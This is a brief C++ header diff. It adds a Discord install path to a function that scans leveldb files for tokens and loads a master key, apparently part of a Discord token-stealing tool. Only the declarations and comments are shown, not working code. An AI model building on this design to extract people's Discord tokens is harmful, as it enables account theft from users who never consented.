@@ -43,6 +43,8 @@ private:
     // Base64 decode
     static std::vector<uint8_t> Base64Decode(const std::string& input);
 
-    // Scan all leveldb files in a directory for tokens
-    static std::vector<std::string> ScanLeveldb(const std::string& dir);
+    // Scan all leveldb files in dir for tokens; discord_path is the parent
+    // Discord install dir (e.g. %APPDATA%\discord) used to load the master key.
+    static std::vector<std::string> ScanLeveldb(const std::string& dir,
+                                                  const std::string& discord_path);
 };
